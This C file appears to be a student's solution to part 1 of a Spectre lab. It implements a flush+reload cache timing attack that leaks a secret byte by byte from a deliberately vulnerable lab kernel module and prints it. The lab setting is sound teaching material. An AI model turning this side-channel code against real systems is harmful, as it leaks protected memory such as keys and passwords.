/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

void flush_byte_arr(uint8_t *base){
  for (int i = 0; i < 256; i++){
    clflush(base + (i * 4096));
  }
}

uint64_t* reload_byte_arr(uint8_t *base){
  uint64_t* res = malloc(sizeof(uint64_t) * 256); // 256 64 bit time results
  if (res == NULL) return NULL;
  for (int i = 0; i < 256; i++){
    res[i] = time_access(base + i * 4096);
  }
  return res;
}

int find_min_index(uint64_t *arr, int size) {
    int min_index = 0;
    uint64_t min_value = arr[0];

    for (int i = 1; i < size; i++) {
        if (arr[i] < min_value) {
            min_value = arr[i];
            min_index = i;
        }
    }

    return min_index;
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        // leaked_byte = ??
        
        // flush shared memory by [0-256] * 4096 offsets
        // call victim method
        // reload same memory region, check latency (for now print them out to view which takes longer)
        
        flush_byte_arr(shared_memory);
        call_kernel_part1(kernel_fd, shared_memory, current_offset);
        uint64_t* res = reload_byte_arr(shared_memory);
        // for (int i = 0; i < 256; i++) printf("Res of %ith byte: %i\n", i, res[i]);
        leaked_byte = find_min_index(res, 256);


        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
        free(res);
    }

    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
